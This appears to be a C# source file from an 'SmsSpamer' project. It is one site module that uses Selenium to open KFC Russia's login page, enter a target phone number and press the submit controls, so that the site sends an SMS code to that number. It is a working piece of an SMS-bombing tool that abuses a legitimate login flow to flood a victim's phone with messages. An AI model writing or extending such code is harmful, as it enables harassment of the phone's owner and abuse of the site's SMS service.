using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;


namespace SmsSpamer.Sites
{
    class Kfc : ISite
    {
        public void SpamSite()
        {
            ISite.browser.Navigate().GoToUrl("https://www.kfc.ru/login");
            ISite.browser.Manage().Window.Maximize();

            ISite.browser.FindElement(By.XPath("//*[@id='root']/div/div[2]/div/div[2]/div/div/div/div[2]/div/input")).SendKeys(ISite.PhoneNumberWithout7);

            IWebElement btn1 = ISite.browser.FindElement(By.XPath("//*[@id='root']/div/div[2]/div/div[3]/label/div"));
            btn1.Click();
            Thread.Sleep(1000);
            
            
            IWebElement btn = ISite.browser.FindElement(By.XPath("//*[@id='root']/div/div[2]/div/button"));
            btn.Click();
        }

    }
}